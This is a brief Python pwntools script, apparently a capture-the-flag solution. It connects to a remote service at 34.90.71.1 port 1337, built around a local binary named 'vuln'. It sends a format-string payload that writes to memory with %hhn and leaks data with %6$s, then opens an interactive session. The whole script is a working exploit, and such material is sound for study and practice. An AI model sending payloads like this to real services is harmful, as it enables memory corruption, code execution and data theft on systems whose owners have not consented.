from pwn import *

context.binary = elf = ELF("./vuln")
#conn = process()
conn = remote('34.90.71.1', 1337)

payload = b'%155c%c%c%c%c%c%hhn%6$s'

conn.sendline(payload)
conn.interactive()
